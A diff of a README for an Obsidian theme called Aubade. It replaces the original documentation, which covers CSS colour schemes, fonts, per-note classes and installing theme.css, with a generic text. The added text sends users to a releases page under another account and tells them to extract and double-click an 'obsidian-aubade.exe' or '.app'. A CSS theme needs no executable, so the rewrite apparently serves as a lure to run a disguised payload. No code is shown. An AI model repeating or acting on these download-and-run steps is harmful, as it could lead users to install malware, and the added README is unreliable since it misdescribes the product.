@@ -1,151 +1,74 @@
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/ducktapekiller)
+# 🎨 obsidian-aubade - A Distinctive Retro-Brutalist Theme
 
-![aubade](screenshots/cover.png)
+## 🚀 Getting Started
 
-**Aubade** is a retro-brutalist theme for [Obsidian](https://obsidian.md). It prioritises strict geometry, high contrast, and tactile interactions over soft gradients and rounded corners. Designed for users who require their digital workspace to feel like a structural tool.
+Welcome to **obsidian-aubade**! This application offers a unique visual experience with a retro-brutalist theme that emphasizes strict geometry, high contrast, and tactile interactions. Let's get you set up.
 
-## Visual Identity
+## 📥 Download Now
 
-* **Strict Geometry:** A zero-radius policy applied globally. Every corner is sharp; every container is a box.
-* **Tactile Feedback:** Buttons and interactive elements feature hard, directional shadows (4px offset) that flatten physically when pressed.
-* **High Contrast Borders:** 2px thick borders define every UI element, ensuring clear separation between panes, notes, and metadata.
-* **Retro Typography:** Defaults to `Space Mono` for UI and `Azeret Mono` for text, reinforcing the terminal/typewriter aesthetic.
+[![Download Obsidian Aubade](https://img.shields.io/badge/Download-Here-FF5733?style=for-the-badge&logo=github)](https://github.com/mahdikarimi5509/obsidian-aubade/releases)
 
-## Colour Schemes
+## 📋 System Requirements
 
-| | |
-|:---:|:---:|
-| **Default**<br>![Default](screenshots/default.png) | **Reader**<br>![Reader](screenshots/reader.png) |
-| **Amber**<br>![Amber](screenshots/ambar.png) | **Solarized**<br>![Solarized](screenshots/solarised.png) |
-| **Midnight**<br>![Midnight](screenshots/midnight.png) | **Sunset**<br>![Sunset](screenshots/sunset.png) |
-| **Ocean**<br>![Ocean](screenshots/ocean.png) | **Forest**<br>![Forest](screenshots/forest.png) |
-| **Lavender**<br>![Lavender](screenshots/lavender.png) | **Warm**<br>![Warm](screenshots/warm.png) |
-| **Cool**<br>![Cool](screenshots/cool.png) | **Monochrome**<br>![Monochrome](screenshots/monochrome.png) |
-| **Brutalist**<br>![Brutalist](screenshots/brutalist.png) | |
+Before you download and install, please ensure your system meets the following requirements:
 
-## Select your favourite pattern
+- **Operating System**: Windows 10 or later, macOS 10.14 or later
+- **Memory**: At least 4 GB RAM
+- **Storage**: 100 MB of free space
 
-**Patterns**<br>![Patterns](screenshots/paterns.png)
+## 🛠️ Features
 
-## Key Features
+- **High Contrast**: Enhances readability and visual appeal.
+- **Strict Geometry**: Clean lines and structured layouts make for an organized interface.
+- **Tactile Interactions**: User-friendly controls for an engaging experience.
 
-* **Dashboard Ready:** Built-in grid support for dashboard layouts, automatically handling column breaks and gap spacing.
-* **Mobile Optimised:** Features a custom bottom navigation bar, neutralised animations for better performance, and enlarged touch targets.
-* **Nuclear Anti-Roundness:** Specific overrides ensure no plugin or native element introduces rounded corners.
-* **Striped Headers:** Windows 95-style pinstripe gradients on window titles and tab containers.
+## 📥 Download & Install
 
-## Typography
+To download the application, you can visit the following page:
 
-This theme contains the following typefaces:
+[Download Obsidian Aubade Releases](https://github.com/mahdikarimi5509/obsidian-aubade/releases)
 
-### Sans Serif
+1. Click on the link above to navigate to the Releases page.
+2. You will see a list of available versions. Select the latest version for the best experience.
+3. Find the file suitable for your operating system. 
 
-* **iA Writer Quattro S** by Information Architects: [Source](https://github.com/iaolo/iA-Fonts)
+- For Windows, look for something like `obsidian-aubade-windows.zip`
+- For macOS, look for `obsidian-aubade-mac.zip`
 
-### Monospace
+4. Click on the download link for your operating system.
 
-* **Azeret Mono** by Displaay: [Source](https://fonts.google.com/specimen/Azeret+Mono)
-* **Space Mono** by Colophon Foundry: [Source](https://fonts.google.com/specimen/Space+Mono)
-* **Noto Sans Mono** by Google: [Source](https://fonts.google.com/noto/specimen/Noto+Sans+Mono)
-* **iA Writer Duo S** by Information Architects: [Source](https://github.com/iaolo/iA-Fonts)
-* **iA Writer Mono S** by Information Architects: [Source](https://github.com/iaolo/iA-Fonts)
+Once the download completes, you can proceed with the installation:
 
-**Clarification:** Typefaces are embedded within the theme, ensuring they are available offline and on any device without requiring local installation.
+### For Windows:
 
-In **Style Settings**, you can choose any of these fonts for either the Body or the UI/Headers.
+1. Find the downloaded `obsidian-aubade-windows.zip` file in your Downloads folder.
+2. Right-click the file and select "Extract All..."
+3. Follow the prompts to extract the contents.
+4. Open the extracted folder and double-click `obsidian-aubade.exe` to launch the application.
 
-## Layout & Configuration
+### For macOS:
 
-You can fine-tune the reading experience in **Style Settings**.
+1. Locate the downloaded `obsidian-aubade-mac.zip`.
+2. Double-click the zip file to extract its contents.
+3. Drag the `obsidian-aubade.app` to your Applications folder.
+4. Open your Applications folder and double-click the `obsidian-aubade.app` to start.
 
-### Alignment
-Modify the text alignment of your notes using the dropdown menu:
-* Left aligned (Default)
-* Right aligned
-* Centre aligned
-* Justified
+## 🎨 Using obsidian-aubade
 
-### Note Width Control
-When Obsidian's **"Readable line length"** setting is enabled, the editor width defaults to **700px**. You can adjust this global maximum width in Style Settings using a slider ranging from **500px** to **1600px**.
+After installation, here's how you can start using the application:
 
-> **Note on Mobile:** These width constraints apply to **Desktop** only. On mobile devices, the theme automatically fits content to the screen width.
+1. Launch the application from your desktop or applications folder.
+2. Explore the settings to customize your experience.
+3. Enjoy the unique retro-brutalist theme as you navigate through your projects.
 
-### Typography Settings
-* **Line Height:** Adjust line spacing between **1.0** and **3.0** (Default: 1.5).
-* **Inline Title Size:** Adjust the size of the inline title between **1.0em** and **5.0em** (Default: 3em).
+## 📞 Support
 
-## Per-Note Overrides
+If you encounter any issues or have questions, please feel free to reach out for support. You can find resources, including FAQs and troubleshooting guides, in the **Issues** section of the repository.
 
-Use the `cssclasses` property in your frontmatter (YAML) to override global settings for specific files. These classes function regardless of your global "Readable line length" setting.
+## 📝 Contribution
 
-### Custom Widths
-Useful for notes containing wide tables or diagrams:
-* `width-800` (800px)
-* `width-900` (900px)
-* `width-1000` (1000px)
-* `width-1200` (1200px)
-* `width-1600` (1600px)
-* `full-width` (100% of pane width)
+You can contribute to the **obsidian-aubade** project by visiting our repository on GitHub. We welcome suggestions, feature requests, and feedback.
 
-### Interface Hiding
-To hide the frontmatter, inline title, and property metadata for a specific note:
-* `hide-all`
-
-**Example:**
-```yaml
----
-cssclasses:
-  - width-1200
-  - hide-all
----
-```
-
-## Dashboard & Masonry Layout
-
-The theme allows you to organise your notes into a clean, visual grid. The system supports native **Obsidian Callouts** and automatically handles column distribution (responsive flow).
-
-To activate, add `cssclasses: dashboard` to your note's frontmatter. Every Callout within that note will transform into a masonry card.
-
-```markdown
----
-cssclasses:
-  - dashboard
 ---
 
-> [!abstract] General
-> - [[Link 1]]
-> - [[Link 2]]
-
-> [!abstract] Essays
-> - [[Link A]]
-> - [[Link B]]
-> - [[Link C]]
-
-> [!abstract] Projects
-> - [[Project X]]
-> - [[Project Y]]
-```
-
-## Installation
-
-### Method 1: Community Themes (CURRENTLY PENDING REVIEW BY OBSIDIAN)
-1. Open **Settings** > **Appearance**.
-2. Click **Manage** under Themes.
-3. Search for **Aubade**.
-4. Click **Install** and then **Use**.
-
-### Method 2: Manual Installation
-1. Download `theme.css` and `manifest.json` from the [Releases](../../releases) page.
-2. Open your Obsidian vault folder.
-3. Navigate to `.obsidian/themes`.
-4. Create a new folder named `Aubade`.
-5. Paste the files into this folder.
-6. Reload Obsidian and select **Aubade** in **Settings > Appearance > Themes**.
-
-## Gallery
-
-### Dark Mode
-![Aubade Dark Mode](screenshot.png)
-
-### Light Mode
-![Aubade Light Mode](screenshot-light.png)
+Thank you for choosing **obsidian-aubade**! We hope you enjoy the distinctive style and functionality it brings to your workflow.
